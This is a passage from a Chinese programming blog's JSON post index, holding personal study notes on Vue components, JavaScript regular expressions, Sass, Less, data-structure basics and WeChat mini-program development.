onAdd)\nhallo.$off(\u0026ldquo;onadd\u0026rdquo;)\n触发事件\nhallo.$emit(\u0026ldquo;onadd\u0026rdquo;, id)\n组件插槽\nconst app = Vue.createApp({\rtemplate: `\r\u0026lt;div\u0026gt;\r\u0026lt;hallo\u0026gt;\r\u0026lt;test/\u0026gt;\r\u0026lt;/hallo\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\rapp.component('test', {\rtemplate: `\u0026lt;span\u0026gt;hahaha\u0026lt;/span\u0026gt;`\r})\rapp.component('hallo', {\r// props: ['num'],\rtemplate: `\r\u0026lt;div\u0026gt;hallo word\r\u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r内部的内容就是vuejs，插槽可以表示任何的DOM元素，子组件一样也可以表示\n当插槽使用了动态数据时，以根组件的data属性为准\n插槽默认值\napp.component('test',{\rtemplate:`\r\u0026lt;div\u0026gt;\rdata：\u0026lt;slot\u0026gt;\u0026lt;span\u0026gt;hallo word\u0026lt;/span\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\r当插槽没有dom元素需要表示，将显示hallo word，当有dom元素表示时，会替换该元素\n具名插槽：可以给slot和子组件分别使用name属性，slot属性，当name属性和slot属性相同，那么就匹配\n当出现多个插槽时，希望一个插槽代表一个dom元素时，就可以具名插槽了，例如：\nconst app = Vue.createApp({\rtemplate: ` \u0026lt;test\u0026gt;\r\u0026lt;template v-slot:a\u0026gt;\u0026lt;div\u0026gt;我是第一个\u0026lt;/div\u0026gt;\u0026lt;/template\u0026gt;\r\u0026lt;template v-slot:b\u0026gt;\u0026lt;div\u0026gt;我是第三个\u0026lt;/div\u0026gt;\u0026lt;/template\u0026gt;\r\u0026lt;/test\u0026gt;\r`\r})\rapp.component('test',{\rtemplate:`\r\u0026lt;div\u0026gt;\r\u0026lt;slot name=\u0026quot;a\u0026quot;\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;\r\u0026lt;slot name=\u0026quot;b\u0026quot;\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r另外v-slot可以简写成#a\n作用域插槽可以访问子组件定义的数据，例如：\nconst app = Vue.createApp({\rtemplate: ` \u0026lt;test v-slot=\u0026quot;props\u0026quot;\u0026gt; {{props.item}}\r\u0026lt;/test\u0026gt;\r`\r})\rapp.component('test', {\rdata() {\rreturn {\ritems: ['hallo', 'hahaha','abc','hallo word','xyz']\r}\r},\rtemplate: `\r\u0026lt;ul\u0026gt;\r\u0026lt;li v-for=\u0026quot;(item, index) in items\u0026quot;\u0026gt;\r\u0026lt;slot :item=\u0026quot;item\u0026quot;\u0026gt;\u0026lt;/slot\u0026gt;\r\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r`\r})\r其中props是子组件传递过来的数据（对象格式）\n简化作用域插槽写法\nconst app = Vue.createApp({\rtemplate: ` \u0026lt;test v-slot={item}\u0026gt; {{item}}\r\u0026lt;/test\u0026gt;\r`\r})\r动态组件\nconst app = Vue.createApp({\rdata(){\rreturn {\rhallo:'test'\r}\r},\rtemplate: ` \u0026lt;keep-alive\u0026gt;\r\u0026lt;component :is=\u0026quot;hallo\u0026quot;\u0026gt;\u0026lt;/component\u0026gt;\r\u0026lt;/keep-alive\u0026gt;\r`\r})\rapp.component('test', {\rtemplate: `\r\u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;\r\u0026lt;input /\u0026gt;\r`\r})\r决定渲染组件由hallo决定,在上面例子中可以看到hallo指向了test，因此渲染的是test，不需要手动设置子组件，而是动态设置，只需要修改:is指向的值就可以了\n而且当使用动态组件时，切换该组件后，该组件的状态将会失活，无法保存状态，需要搭配使用，保存这些状态，不只是方便保存缓存，而且还可以避免重新渲染\n异步组件\nconst app = Vue.createApp({\rdata(){\rreturn {\rhallo:'asyncs'\r}\r},\rtemplate: ` \u0026lt;keep-alive\u0026gt;\r\u0026lt;component :is=\u0026quot;hallo\u0026quot;\u0026gt;\u0026lt;/component\u0026gt;\r\u0026lt;/keep-alive\u0026gt;\r`\r})\rapp.component('asyncs', Vue.defineAsyncComponent(() =\u0026gt; {\rreturn new Promise((resolve, reject) =\u0026gt; {\rsetTimeout(() =\u0026gt; {\rresolve({\rtemplate: `\u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;`\r})\r},1000)\r})\r}))\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r可以看到该组件并不会立马渲染，该组件不会在第一次加载渲染时显示，而是当需要用到它时才会渲染，可以优化页面首次渲染性能\nprovide/inject\n当存在多级组件时，祖先组件想传递组件给子孙组件时，如果使用props传递数据的话，需要一层接收然后在传递给后辈，非常麻烦\nconst app = Vue.createApp({\rdata(){\rreturn {num: 100}\r},\rprovide:{\rhaha: 200\r},\rtemplate: `\r\u0026lt;hallo :num=\u0026quot;num\u0026quot; /\u0026gt;\r`\r})\rapp.component('hallo',{\rprops:['num'],\rinject:['haha'],\rtemplate:`\r\u0026lt;div\u0026gt;{{num}},{{haha}}\u0026lt;/div\u0026gt;\r`\r})\r这里只是举个例子，如果是多层组件结构，这个方法也是可以发送和接收到的，只需要provide发送一下数据，然后子组件inject接收一下\n\u0026ndash;\nVue.extend()，vue基础构造器，会创建一个子类，参数是包含组件的对象，例如：\n\u0026lt;div id='app'\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst Test = Vue.extend({\rtemplate: '\u0026lt;p\u0026gt;{{a}} {{b}} {{c}}\u0026lt;/p\u0026gt;',\rdata: function () {\rreturn {\ra: 'hallo',\rb: 'abc',\rc: 'xyz'\r}\r}\r})\rnew Test().$mount('#app')\r\u0026lt;script\u0026gt;\r受控组件和非受控组件\n","permalink":"https://99999.fun/posts/53/","summary":"组件注册\n.component()接收2个参数，其中第一个参数是组件名（数据类型是字符串）\n组件名命名：\n全部小写，多个单词用连字符连接（-减号）\n因为html中是大小写不敏感的，浏览器会将大写解析为小写，因此不要使用驼峰命名法来命名自定义标签，而是使用连字符分隔\n组件被引用时，也必须是相同的名，例如：组件名是img-data，那么被引用时标签为，闭不闭合看组件的定义，如果组件的定义是img之类的，就不需要闭合\n直接暴露在vue实例的组件都是全局组件，可以直接在组件实例中调用\n局部组件是使用一个JavaScript对象进行定义封装，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;datas-a\u0026gt;\u0026lt;/datas-a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst datas ={\rtemplate: `\r\u0026lt;div\u0026gt;\rhallo\r\u0026lt;/div\u0026gt;\r`\r}\rconst hallo = Vue.createApp({\rcomponents: {\r\u0026quot;datas-a\u0026quot; : datas\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\rcomponents对象，键为自定义元素的名称，值为组件的实质对象\n局部组件的属性是不能直接被调用的，但是可以在另一个组件中指向其为自己的子组件，例如：\nconst datab ={\rcomponents: {\r\u0026quot;datas-a\u0026quot; : dataa\r}\r}\r模块系统\n通过导入模块的方式导入组件，例如：\nimport datas from \u0026lsquo;./datas\u0026rsquo;\n那么datas组件就是可以在当前使用了\nProps\nprop类型\n用对象的方式列出prop，并且定义其类型，当传入的prop类型不对就会报错（开发版本），例如：\nconst hallo = Vue.createApp({\rcomponent: {\rprops:{\rabc: String,\rxyz: Boolean,\r},\rtemplate: `\u0026lt;h1\u0026gt;{{abc.","title":"深入学习vue组件"},{"content":"正则表达式（Regular Expression）是用于匹配字符串中字符组合的模式，在JavaScript中，正则表达式也是对象\nJavaScript创建正则表达式\n使用RegExp对象创建\nvar hallo = new RegExp(/123/);\n或者\nvar hallo = /123/;\n检查是否符合该正则表达式\n使用test方法判断字符串是否符合该规则的要求，返回的值是布尔值\nconsole.log(hallo.test(123));\n/123/只要包含123就返回true\n正则表达式元字符\n边界符（^和$）\n^表示匹配行首的文本（以谁开始）\n$表示行尾的文本（以谁结束）\nvar hallo = ^abc;\n必须要abc开头，如果是aabc的话，返回false\nvar hallo = abc$;\n必须要abc结尾，例如aabc，返回true\nvar hallo = ^abc$;\n^和$一起使用就是精确匹配，必须是abc，如果是abcabc的话，返回false\n字符类[]\nvar hallo = /[abc]/;\n只要包含a，b，c其中一个字符都匹配，返回true，例如axx\nvar hallo = /^[abc]$/;\n三选一，只有包含a，b，c其中单独的一个才匹配返回true，例如abc，就返回false\n范围符-\nvar hallo = /^[a-z]$/;\n多选一，a到z，包含26个字母任何一个字母都返回true，大小写敏感，A和a不一样\nvar hallo = /^[a-zA-Z0-9_-]$/;\n多选一，包含26个字母（包含大小写）任何一个字母和数字（0到9）和下划线其中一个都返回true\n取反\nvar hallo = /^[^a-z]$/;\n在方括号内部加^，就是代表取反，不能包含a到z其中的一个字母\n量词符（*，+，?）\nvar hallo = /a*/;\n*相当于\u0026gt;=0，出现0次或者n次都返回true\nvar hallo = /a+/;\n+相当于\u0026gt;=1，出现1次或者n次返回true\nvar hallo = /a?/;\n?相当于 0 || 1，只要出现0次或者1次返回true\n{n}：重复n次\n{n,}：重复次数大于等于n次\n{n,i}：重复次数大于等于n，并且小于等于16\n量词是设定规则出现的次数\n例如：\nvar hallo = /^[a-zA-Z0-9_-]{6,16}$/; console.log(hallo.test(\u0026ldquo;hallo123\u0026rdquo;)); // true\nvar hallo = /(abc){3}/;\n将abc重复3次，abcabcabc才返回true\n预定义类\n预定义类指的是一些常用规则的简写，大小写敏感\n\\d：匹配0-9的任何数字 \\D：匹配所有0-9以外的字符，取反 \\w：匹配任何的字母，数字，下划线，相当于[a-zA-Z0-9_-] \\W：匹配任何的字母，数字，下划线以外的字符，取反 \\s：匹配空格（包含换行符，制表符，空格符等），相当于[\\t\\r\\n\\v\\f] \\S：匹配非空格，相当于[^\\t\\r\\n\\v\\f]\n\\b 单词边界 /\\bhello\\b/` \\B 除了单词边界\n[^] 除了 [] 选择 - 之间 | 或 ^ 匹配开头 $ 匹配尾\n替换\nreplace()，可以替换字符串或者正则表达式\nreplace(匹配字符串,被替换的字符串)\n字符串\nvar hallo = \u0026ldquo;hallo\u0026rdquo;;\nhallo.replace(\u0026ldquo;hallo\u0026rdquo;,\u0026ldquo;hi\u0026rdquo;);\n正则表达式\nvar hallo = \u0026ldquo;hallo\u0026rdquo;;\nhallo.replace(\u0026quot;/hallo/\u0026quot;,\u0026ldquo;hi\u0026rdquo;);\n正则表达式参数\n/表达式/[修饰符]\n修饰符有3个值\ng：全局匹配\ni：忽略大小写\ngi：全局匹配+忽略大小写\n例如：\nvar hallo = \u0026ldquo;hallo\u0026rdquo;;\nhallo.replace(\u0026quot;/hallo|hi/g\u0026quot;,\u0026quot;*\u0026quot;);\n正向预查和负向预查\n正则捕获的懒惰性和贪婪性\n","permalink":"https://99999.fun/posts/52/","summary":"正则表达式（Regular Expression）是用于匹配字符串中字符组合的模式，在JavaScript中，正则表达式也是对象\nJavaScript创建正则表达式\n使用RegExp对象创建\nvar hallo = new RegExp(/123/);\n或者\nvar hallo = /123/;\n检查是否符合该正则表达式\n使用test方法判断字符串是否符合该规则的要求，返回的值是布尔值\nconsole.log(hallo.test(123));\n/123/只要包含123就返回true\n正则表达式元字符\n边界符（^和$）\n^表示匹配行首的文本（以谁开始）\n$表示行尾的文本（以谁结束）\nvar hallo = ^abc;\n必须要abc开头，如果是aabc的话，返回false\nvar hallo = abc$;\n必须要abc结尾，例如aabc，返回true\nvar hallo = ^abc$;\n^和$一起使用就是精确匹配，必须是abc，如果是abcabc的话，返回false\n字符类[]\nvar hallo = /[abc]/;\n只要包含a，b，c其中一个字符都匹配，返回true，例如axx\nvar hallo = /^[abc]$/;\n三选一，只有包含a，b，c其中单独的一个才匹配返回true，例如abc，就返回false\n范围符-\nvar hallo = /^[a-z]$/;\n多选一，a到z，包含26个字母任何一个字母都返回true，大小写敏感，A和a不一样\nvar hallo = /^[a-zA-Z0-9_-]$/;\n多选一，包含26个字母（包含大小写）任何一个字母和数字（0到9）和下划线其中一个都返回true\n取反\nvar hallo = /^[^a-z]$/;\n在方括号内部加^，就是代表取反，不能包含a到z其中的一个字母\n量词符（*，+，?）\nvar hallo = /a*/;","title":"正则表达式学习笔记"},{"content":"sass是一门css扩展语言，css预处理器\nsass是基于ruby语言开发，在前端中可以使用npm安装\nnpm install node-sass或者npm install node-sass \u0026ndash;save-dev\n当然也可以安装ruby，通过gem托管服务进行安装sass\ngem install sass\n文件\nhallo.scss\n解析为css文件\nsass hallo.scss hallo.css\nsass提供了4种编译风格\nnested：嵌套缩进的css代码，默认值\nexpanded：没有缩进，扩展的css代码\ncompact：简洁格式的css代码\ncompressed：压缩后的css代码，生产环境一般选择这个\n编译风格使用语法\nsass \u0026ndash;style nested hallo.scss hallo.css\n也可以让sass自动编译\n监听文件\nsass \u0026ndash;watch hallo.scss:hallo.css\n监听目录\nsass \u0026ndash;watch sass/style.scss:css/style.css\n注意：目录不要有中文\n注释\n/* 注释 */\n// 注释\n/*! 注释 */\n第一种注释，会保留到编译后的css文件中\n第二种注释，不会编译到编译后的css文件中\n第三种注释，是表示重要注释，就算就是压缩编译，也会保留这个注释，一般用来声明版权\n变量\n$color: #ccc;\r#app{\rcolor: $color;\r}\r变量也可以嵌套到属性中\n$right: right;\r#app{\rmargin-#{$right}: 50px;\r}\r运算\n允许使用加减乘除运算\n#app{\rwidth: 100px + 20px;\rheight: (300px / 3) * 2;\r}\r嵌套，嵌套一般用在有同一个父元素（祖先元素）下，例如：\n.nav{\rpadding: 100px;\r.nav-ul{\rright: left;\r.nav-li{\rmargin: 10px;\r}\r}\u0026amp;:hover{\rcolor: #ccc;\r}\r}\r伪类或者伪元素需要在其前面加\u0026amp;\n继承\nsass可以将一个样式集继承到另一个继承集中\n.container{\rwidth: 100px;\r}\r#app{\r@extend .container;\rheight: 100px;\r}\r混合\n@mixin width{\rwidth: 100px;\r}\r#app{\r@include: width;\r}\r混合和继承的区别就是，混合可以指定参数\n@mixin width($nums: 60px){\rwidth: $nums;\r}\r#app{\r@include: width(100px);\r}\r函数\n提供了一下函数来处理颜色之类的\ngrayscale(#333)\n导入外部文件\n导入scss文件 @import \u0026ldquo;scss/hallo.scss\u0026rdquo;;\n导入css文件 @import \u0026ldquo;css/hallo.css\u0026rdquo;\n条件判断\n#app{\r@if 100 \u0026lt; 60 { width: 100px;\r} @else {\rwidth: 60px;\r}\r}\r循环\nfor\n@for $i from 1 to 6 {\r.col-#{$i} {\rborder: #{$i}px solid #ccc;\r}\r}\rwhile\n$i : 6;\r@while $i \u0026gt; 0 {\r.col-#{$i} {\rwidth: 100px * $i;\r}\r$i : $i - 1;\r}\reach\n@each $nums in 1,2,3 {\r.col-#{$nums} {\rbackground-image: url(\u0026quot;/image/#{$nums}.jpg\u0026quot;);\r}\r}\r自定义函数\n@function hallo($i) {\r@return ($i * 2) + 100;\r}\r#app {\rwidth: hallo(10px);\r}\r","permalink":"https://99999.fun/posts/51/","summary":"sass是一门css扩展语言，css预处理器\nsass是基于ruby语言开发，在前端中可以使用npm安装\nnpm install node-sass或者npm install node-sass \u0026ndash;save-dev\n当然也可以安装ruby，通过gem托管服务进行安装sass\ngem install sass\n文件\nhallo.scss\n解析为css文件\nsass hallo.scss hallo.css\nsass提供了4种编译风格\nnested：嵌套缩进的css代码，默认值\nexpanded：没有缩进，扩展的css代码\ncompact：简洁格式的css代码\ncompressed：压缩后的css代码，生产环境一般选择这个\n编译风格使用语法\nsass \u0026ndash;style nested hallo.scss hallo.css\n也可以让sass自动编译\n监听文件\nsass \u0026ndash;watch hallo.scss:hallo.css\n监听目录\nsass \u0026ndash;watch sass/style.scss:css/style.css\n注意：目录不要有中文\n注释\n/* 注释 */\n// 注释\n/*! 注释 */\n第一种注释，会保留到编译后的css文件中\n第二种注释，不会编译到编译后的css文件中\n第三种注释，是表示重要注释，就算就是压缩编译，也会保留这个注释，一般用来声明版权\n变量\n$color: #ccc;\r#app{\rcolor: $color;\r}\r变量也可以嵌套到属性中\n$right: right;\r#app{\rmargin-#{$right}: 50px;\r}\r运算\n允许使用加减乘除运算\n#app{\rwidth: 100px + 20px;\rheight: (300px / 3) * 2;\r}\r嵌套，嵌套一般用在有同一个父元素（祖先元素）下，例如：","title":"CSS预处理器-Sass学习笔记"},{"content":"less是一门css扩展语言，是css预处理器，扩展了css的动态特性，在css语法基础上引入了变量，混合，运算和函数等功能\n常见的css预处理器有sass，less，stylus\nless开发手册：https://less.bootcss.com/\n安装less\nnpm install -g less\n检查是否安装成功\nlessc -v\n或者使用CDN和src导入的方法也都是可以的\n例如：\nhttps://cdn.jsdelivr.net/npm/less@4.1.1/dist/less.min.js\nless文件\nhallo.less\n注释\n/*块注释*/\n// 行注释\n变量\n变量名命名规范\n必须是以@开头\n不能包含特殊字符\n不能以数字开头\n大小写敏感\n例如：\n@color: #ccc;\r#app{\rbackground-color: @color;\r}\rless编译\nless提供了一个解析器，通过解析器，编译成css文件\n例如：\nnpm\nlessc style.less style.css\n将style.less编译成style.css文件\n或者\nvsc插件：Easy LESS（修改保存就自动编译成css文件）\nless嵌套\n子元素嵌套到父元素上（后代选择器）\n#app{\rwidth: 100px;\rdiv{\rwidth: 60px;\r}\r}\r伪类或者伪元素选择之类的，需要加\u0026amp;连接起来，不加则认为是后代\n#app{\rwidth: 100px;\ra{\rcolor: #000;\r\u0026amp;:hover{\rcolor: @color;\r}\r\u0026amp;::before{\rwidth: 30px;\r}\r} }\rless运算\n数值，颜色，变量都可以参与运算，加减乘除\n@width: 50px;\r#app{\rwidth: 100px - 10;\rheight: 100px * 3;\rdiv{\rwidth: (@width / 30) * 6;\r}\r}\r#app{\rcolor: #666 - #333;\r}\r上面得到的是#333\n注意：\n如果有两个不同单位的值运算，运算结果单位取第一个值的单位\n如果有两个值，它们只要一个单位，取该单位作为运算结果单位\n运算符中间左右两边要有空格分开\n混合\n混合（Mixin）可以将一组属性从包含到另一个集合中，例如：\n.container{\rmax-width: 980px;\rmargin-left: auto;\rmargin-right: auto;\r}\r#app{\r.container\r}\r转义\n转义允许使用任意字符串作为属性或者变量值，例如：\n@max768: ~\u0026quot;(max-width: 768px)\u0026quot;~\r.nav-svg{\r@media @max768{\rdisplay: none;\r}\r}\r函数\nless内置了多个函数，用于算术运算，颜色处理等等\n@width: 0.6;\r#app{\rwidth: percentage(@width); // 60%\r}\r映射\n映射支持less3.5以上版本，例如：\n#data(){\rwidth: 100px;\r}\r#app{\rwidth: #data[width];\r}\r","permalink":"https://99999.fun/posts/50/","summary":"less是一门css扩展语言，是css预处理器，扩展了css的动态特性，在css语法基础上引入了变量，混合，运算和函数等功能\n常见的css预处理器有sass，less，stylus\nless开发手册：https://less.bootcss.com/\n安装less\nnpm install -g less\n检查是否安装成功\nlessc -v\n或者使用CDN和src导入的方法也都是可以的\n例如：\nhttps://cdn.jsdelivr.net/npm/less@4.1.1/dist/less.min.js\nless文件\nhallo.less\n注释\n/*块注释*/\n// 行注释\n变量\n变量名命名规范\n必须是以@开头\n不能包含特殊字符\n不能以数字开头\n大小写敏感\n例如：\n@color: #ccc;\r#app{\rbackground-color: @color;\r}\rless编译\nless提供了一个解析器，通过解析器，编译成css文件\n例如：\nnpm\nlessc style.less style.css\n将style.less编译成style.css文件\n或者\nvsc插件：Easy LESS（修改保存就自动编译成css文件）\nless嵌套\n子元素嵌套到父元素上（后代选择器）\n#app{\rwidth: 100px;\rdiv{\rwidth: 60px;\r}\r}\r伪类或者伪元素选择之类的，需要加\u0026amp;连接起来，不加则认为是后代\n#app{\rwidth: 100px;\ra{\rcolor: #000;\r\u0026amp;:hover{\rcolor: @color;\r}\r\u0026amp;::before{\rwidth: 30px;\r}\r} }\rless运算","title":"CSS预处理器-Less学习笔记"},{"content":"根据于小甲鱼大佬的数据结构与算法教程而 ~~ 写 ~~ 抄的笔记\n什么是数据结构？\n数据结构是一门研究非数值计算的程序设计问题中的操作对象，以及它们之间的关系和操作等相关问题的学科。\n程序设计 = 数据结构 + 算法\n数据元素相互之间存在的一种或多种特定关系的集合\n数据结构分为逻辑结构和物理结构\n逻辑结构：指的是数据对象中数据元素之间的相互关系\n物理结构：指的是数据的逻辑结构在计算机中的存储形式\n四大逻辑结构：\n集合结构： 集合结构中的数据元素是同属性一个集合的\n线性结构：线性结构中的数据元素之间是一对一的关系\n树型结构：树性结构中数据元素之间存在一种一对多的层次关系\n图形结构：图形结构的数据元素是多对多的关系\n物理结构：实质是研究如何将数据元素存储到计算机的存储器中\n存储器主要是针对于内存，外部存储器（例如：硬盘）的数据组织一般用文件结构来表示\n数据元素的存储结构形式有两种，顺序存储和链式存储\n顺序存储结构：指的是数据元素存放在地址连续的存储单元里，其数据之间的逻辑关系和物理关系是一样的，例如编程语言中的数组\n链式存储结构：经常变化的结构，指的是将数据元素存放在任意的存储单元里，而这组存储单元是可以连续的，也可以是不连续的，数据元素存储关系不能反应其逻辑关系，通过分配一个指针指向一个内存，而这个内存用来存放数据元素的地址，通过内存来寻找相对应的数据元素地址\n算法：算法是解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令一个或多个的操作，就是一个解决问题的技巧或者方式\n一个问题可以用多个算法解决，但是一个算法不能解决所有问题的能力\n算法五个基本特征：输入，输出，有穷性，确定性和可行性\n输入：算法具有零个或者多个输入\n输出：算法至少有一个或者多个输出\n有穷性：指的是算法在执行有限的步骤之后，自动结束，而不是无限循环，要求每一个步骤在一段时间内完成，而不是永远不会停止的\n确定性：算法的每一个步骤都具有确定的含义，不会出现二义性（二义性指的是一个东西在一个环境下出来两种或者两种以上的含义）\n可行性：算法的每一个步骤必须是可行的，，每一个步骤都可以通过执行有限次数完成\n算法设计的要求：\n正确性：算法必须要具备输入，输出，无歧义，能正确反应问题的要求，能够得到问题的正确答案\n算法没有语法错误，能对合法的输入返回满足要求的输出，对于非法输入能返回满足要求的说明，对于输入的内容要满足其满足要求的输出结果\n可读性：算法的另一目的是方便阅读，理解或者交流其算法的实现原理\n健壮性：当输入数据不合法时，算法也能做出对应的处理，而不是产生异常，崩溃之类的\n时间效率高和存储量低\n算法效率的度量方法\n算法的效率一般指的是算法的执行时间\n事后统计方法：这种方法主要是通过设计好的程序和数据，利用计算机计时器对不同算法的运行时间进行比较，从而达到确定算法效率的高低\n缺点：需要根据算法事先编写好测试程序，需要耗费大量时间和精力，不同的测试环境下的效率差异大\n事前分析估算方法：在编写程序之前，依据统计方法对算法进行估算\n影响算法效率的原因：\n算法采用的策略或者方案\n代码质量\n问题的输入规模\n机器执行指令的速度\n一个算法程序的运行时间依赖于算法的好坏和问题的输入规模（输入量）\n算法的复杂性实际上就是算法因为输入规模扩大而增长量的一个抽象，只关心其实现的算法\n函数的渐近增长\n最高次项相乘的常数并不重要，可以忽略\n所以一个算法存在一个常数，那么这个常数基本上可以忽略\n最高次项的指数大的，函数会随着n的增长，结果也会变得增长特别快。指数！！！ 判断一个算法的效率时间，应该忽略函数中的常数和其他次要项，而关注最高项（主项）的阶数\n算法的时间复杂度\n算法时间复杂度的定义：\n在进行算法分析时，语句总的执行次数T(n)是关于问题规模n的函数，分析T(n)随n的变化情况并确定T(n)的数量级。算法的时间复杂度，也就是算法的时间量度，T(n) = O(f(n))，表示随问题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称为时间复杂度，f(n)是问题规模n的某个函数。\n像上面的，用大写O（）来体现算法时间复杂度的记法，我们称之为大O记法。\n随着输入规模n的增大，T(n)增长最慢的算法为最优算法\n简称为执行次数等于时间\n分析一个算法的时间复杂度（推导大O阶方法）：\n用常数1取代运行时间中的所有加法常数\n在修改后的运行次数函数中，只保留最高阶项\n如果最高阶项存在且不是1，则去除于这个项相乘的常数\n得到的就是大O阶\n线性阶\n一般含有非嵌套循环涉及线性阶，线性阶就是随着问题规模n的扩大，对应计算次数呈直线增长\n平方阶\n循环的时间复杂度等于循环体的复杂度乘以该循环运行的次数\n对数阶\n","permalink":"https://99999.fun/posts/49/","summary":"根据于小甲鱼大佬的数据结构与算法教程而 ~~ 写 ~~ 抄的笔记\n什么是数据结构？\n数据结构是一门研究非数值计算的程序设计问题中的操作对象，以及它们之间的关系和操作等相关问题的学科。\n程序设计 = 数据结构 + 算法\n数据元素相互之间存在的一种或多种特定关系的集合\n数据结构分为逻辑结构和物理结构\n逻辑结构：指的是数据对象中数据元素之间的相互关系\n物理结构：指的是数据的逻辑结构在计算机中的存储形式\n四大逻辑结构：\n集合结构： 集合结构中的数据元素是同属性一个集合的\n线性结构：线性结构中的数据元素之间是一对一的关系\n树型结构：树性结构中数据元素之间存在一种一对多的层次关系\n图形结构：图形结构的数据元素是多对多的关系\n物理结构：实质是研究如何将数据元素存储到计算机的存储器中\n存储器主要是针对于内存，外部存储器（例如：硬盘）的数据组织一般用文件结构来表示\n数据元素的存储结构形式有两种，顺序存储和链式存储\n顺序存储结构：指的是数据元素存放在地址连续的存储单元里，其数据之间的逻辑关系和物理关系是一样的，例如编程语言中的数组\n链式存储结构：经常变化的结构，指的是将数据元素存放在任意的存储单元里，而这组存储单元是可以连续的，也可以是不连续的，数据元素存储关系不能反应其逻辑关系，通过分配一个指针指向一个内存，而这个内存用来存放数据元素的地址，通过内存来寻找相对应的数据元素地址\n算法：算法是解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令一个或多个的操作，就是一个解决问题的技巧或者方式\n一个问题可以用多个算法解决，但是一个算法不能解决所有问题的能力\n算法五个基本特征：输入，输出，有穷性，确定性和可行性\n输入：算法具有零个或者多个输入\n输出：算法至少有一个或者多个输出\n有穷性：指的是算法在执行有限的步骤之后，自动结束，而不是无限循环，要求每一个步骤在一段时间内完成，而不是永远不会停止的\n确定性：算法的每一个步骤都具有确定的含义，不会出现二义性（二义性指的是一个东西在一个环境下出来两种或者两种以上的含义）\n可行性：算法的每一个步骤必须是可行的，，每一个步骤都可以通过执行有限次数完成\n算法设计的要求：\n正确性：算法必须要具备输入，输出，无歧义，能正确反应问题的要求，能够得到问题的正确答案\n算法没有语法错误，能对合法的输入返回满足要求的输出，对于非法输入能返回满足要求的说明，对于输入的内容要满足其满足要求的输出结果\n可读性：算法的另一目的是方便阅读，理解或者交流其算法的实现原理\n健壮性：当输入数据不合法时，算法也能做出对应的处理，而不是产生异常，崩溃之类的\n时间效率高和存储量低\n算法效率的度量方法\n算法的效率一般指的是算法的执行时间\n事后统计方法：这种方法主要是通过设计好的程序和数据，利用计算机计时器对不同算法的运行时间进行比较，从而达到确定算法效率的高低\n缺点：需要根据算法事先编写好测试程序，需要耗费大量时间和精力，不同的测试环境下的效率差异大\n事前分析估算方法：在编写程序之前，依据统计方法对算法进行估算\n影响算法效率的原因：\n算法采用的策略或者方案\n代码质量\n问题的输入规模\n机器执行指令的速度\n一个算法程序的运行时间依赖于算法的好坏和问题的输入规模（输入量）\n算法的复杂性实际上就是算法因为输入规模扩大而增长量的一个抽象，只关心其实现的算法\n函数的渐近增长\n最高次项相乘的常数并不重要，可以忽略\n所以一个算法存在一个常数，那么这个常数基本上可以忽略\n最高次项的指数大的，函数会随着n的增长，结果也会变得增长特别快。指数！！！ 判断一个算法的效率时间，应该忽略函数中的常数和其他次要项，而关注最高项（主项）的阶数\n算法的时间复杂度\n算法时间复杂度的定义：\n在进行算法分析时，语句总的执行次数T(n)是关于问题规模n的函数，分析T(n)随n的变化情况并确定T(n)的数量级。算法的时间复杂度，也就是算法的时间量度，T(n) = O(f(n))，表示随问题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称为时间复杂度，f(n)是问题规模n的某个函数。\n像上面的，用大写O（）来体现算法时间复杂度的记法，我们称之为大O记法。\n随着输入规模n的增大，T(n)增长最慢的算法为最优算法\n简称为执行次数等于时间\n分析一个算法的时间复杂度（推导大O阶方法）：\n用常数1取代运行时间中的所有加法常数\n在修改后的运行次数函数中，只保留最高阶项\n如果最高阶项存在且不是1，则去除于这个项相乘的常数","title":"数据结构与算法学习笔记"},{"content":"小程序实质上就是一个基于web基础的应用程序（网页）（但是不支持浏览器的api，小程序的api全部由微信提供，高度依赖微信，因此只能在微信中运行）\n微信之父张小龙是这样描述小程序的：\n小程序是一种不需要下载安装就可以使用的应用，它实现了应用触手可及的梦想。\n用户扫一扫或者搜一下即可打开应用，也体现了用完即走的理念。\n用户不用关心是否安装太多应用的问题，应用将无处不在，随时可用，但又无需安装卸载\n微信小程序的接口服务器要求进行ICP备案，并且经过审核，才能发布小程序\n微信小程序开发文档\nhttps://developers.weixin.qq.com/miniprogram/dev/framework/\n开发工具：微信开发者工具\n小程序的宿主环境\n在iOS中，使用JavaScriptCore，在Android中使用X5内核，在ide中使用nwjs\n小程序的运行机制（冷启动，热启动）\n小程序在后台中停留一段时间后，被微信销毁，再打开时需要重新加载该小程序的资源，也就是冷启动，而在没被销毁的时间段内，再打开该小程序，是不需要重新加载资源，是热启动\n小程序发布更新时，会异步加载新资源，也会导致冷启动\n小程序产品需求\n发现真实需要\n用户深度访谈，分析竞品，付费意愿\n需求分期：最小化可行产品（MVP）\n不是每个功能都要开发（优先开发最重要和最紧急的功能）\n优化开发顺序，先开发基础可用，然后迭代更新功能，满足用户需求，功能文档\n根据用户体验来优化服务\n原型制作工具：墨刀，Axure\n微信小程序结构\nindex.wxml页面结构\nindex.wxss页面样式\nindex.js页面逻辑\n如果设置了单独的页面样式，那么会覆盖掉app.wxss的样式\napp.json定义了页面和基本配置，采用json格式，必须包含pages属性，说明小程序有哪些页面\napp.json文件结构\npages是用来定义页面的，是一个数组，每一个项都是